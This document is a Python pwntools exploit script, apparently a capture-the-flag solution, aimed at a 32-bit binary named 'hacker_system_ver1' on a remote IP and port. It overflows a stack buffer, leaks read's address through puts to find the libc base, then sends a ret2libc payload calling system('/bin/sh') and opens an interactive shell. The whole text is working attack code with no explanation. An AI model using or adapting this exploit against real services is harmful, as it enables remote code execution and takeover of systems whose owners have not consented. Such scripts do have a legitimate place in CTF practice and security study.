from pwn import *

context.log_level = 'debug'
context.terminal = ['gnoma-terminal', '-x', 'bash', '-c']

local = 0;

if local:
	cn = process('./hacker_system_ver1')
	elf = ELF('./hacker_system_ver1')
	libc = ELF('./libc.so')
else:
	cn = remote('111.230.149.72', 10005)
	elf = ELF('./hacker_system_ver1')
	libc = ELF('./libc32.so')

def z(a=''):
	gdb.attach(cn, a)
	if a == '':
		raw_input()

pret=0x08048455

payload = 'a'*0x34 + 'bbbb'
payload += p32(elf.plt['puts']) + p32(pret) + p32(elf.got['read'])
payload += p32(0x08048a20)

cn.sendline('2')
cn.recv()
cn.sendline('1000')
cn.recv()
cn.sendline(payload)

cn.recvuntil('\n')
libc_base = u32(cn.recv(4)) - libc.symbols['read']
success(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh\x00').next()

print 'system: ', hex(system)
print 'binsh: ', hex(binsh)

payload = 'a'*0x34 + 'bbbb'
payload += p32(system) + p32(pret) + p32(binsh)
cn.sendline('1000')
cn.recv()
cn.sendline(payload)
cn.interactive()
